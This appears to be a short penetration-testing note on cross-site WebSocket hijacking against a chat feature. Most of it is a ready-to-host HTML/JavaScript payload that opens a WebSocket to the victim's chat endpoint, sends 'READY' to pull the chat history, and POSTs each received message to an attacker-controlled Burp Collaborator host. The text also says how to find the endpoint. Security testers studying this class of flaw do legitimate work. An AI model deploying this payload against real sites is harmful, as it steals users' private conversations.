## WebSocket Test Cases
### Cross-site WebSocket hijacking
Chat feature completly relies on websocket. After switching protocol response, the first automatic request sent from the client to initiate chat is 'READY' and in return we get back the history of the chat.
Let's host a malicious file on attacker's server.
```
<script>
    var ws = new WebSocket('wss://CHAT_ENDPOINT');
    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://BURP_COLLOBARTOR', {method: 'POST', mode: 'no-cors', body: event.data});
    }
</script>
```
CHAT_ENDPOINT you can find from the websocket history, just remove https as we are using wss.
